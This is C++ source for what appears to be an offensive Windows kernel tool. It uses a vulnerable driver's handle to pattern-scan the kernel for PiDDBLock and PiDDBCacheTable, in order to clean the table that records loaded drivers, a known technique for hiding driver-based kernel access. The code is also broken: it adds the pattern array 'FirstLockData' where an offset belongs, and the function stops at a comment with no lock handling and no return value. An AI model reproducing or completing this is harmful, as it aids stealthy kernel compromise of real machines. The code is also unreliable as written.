#include "vulndriver.h"
#include "utils.h"
#include "additional_nt.h"


NTSTATUS VulnurableDriver::PersistenceFunctions::CleanPiDDBCacheTable(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID* RelativePiDDBLock, PVOID* RelativePiDDBCacheTable) {
	BYTE FirstLockData[] = "\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24";
	BYTE SecondLockData[] = "\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8";
	BYTE TableData[] = "\x66\x03\xD2\x48\x8D\x0D";
	const char* FirstLockMask = "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x";
	const char* SecondLockMask = "xxx????xxxxx????xxx????x????x";
	const char* TableMask = "xxxxxx";
	ULONG FirstLockOffset = 28;  // Offset from the first lock pattern to the data
	ULONG SecondLockOffset = 16;  // Offset from the second lock pattern to the data
	PVOID ActualPiDDBLock = NULL;
	nt::PRTL_AVL_TABLE ActualPiDDBCacheTable = NULL;

	
	// Find PiDDBLock and PiDDBCacheTable with matching patterns:
	*RelativePiDDBLock = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", KernelBaseAddress, FirstLockData, FirstLockMask);
	*RelativePiDDBCacheTable = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", KernelBaseAddress, TableData, TableMask);
	if (*RelativePiDDBLock == NULL){
		*RelativePiDDBLock = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", KernelBaseAddress, SecondLockData, SecondLockMask);
		if (*RelativePiDDBLock == NULL) {
			printf("[-] Cannot clean PiDDBCacheTable - PiDDBLock not found with both patterns\n");
			return STATUS_UNSUCCESSFUL;
		}
		printf("[+] Found PiDDBLock with second pattern at address %p\n", *RelativePiDDBLock);
		*RelativePiDDBLock = (PVOID)((ULONG64)*RelativePiDDBLock + SecondLockOffset);
	}
	else {
		printf("[+] Found PiDDBLock with first pattern at address %p\n", *RelativePiDDBLock);
		*RelativePiDDBLock = (PVOID)((ULONG64)*RelativePiDDBLock + FirstLockData);
	}
	if (*RelativePiDDBCacheTable == NULL) {
		printf("[-] Cannot clean PiDDBCacheTable - PiDDBCacheTable not found  pattern\n");
		return STATUS_UNSUCCESSFUL;
	}
	else {
		printf("[+] Found PiDDBCacheTable with pattern at address %p\n", *RelativePiDDBCacheTable);
	}


	// Parse the relative addresses in the system module to the actual address:
	ActualPiDDBLock = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, *RelativePiDDBLock, 3, 7);
	ActualPiDDBCacheTable = (nt::PRTL_AVL_TABLE)VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, *RelativePiDDBCacheTable, 6, 10);

	
	// Acquire the PiDDB lock to manipulate the table:

}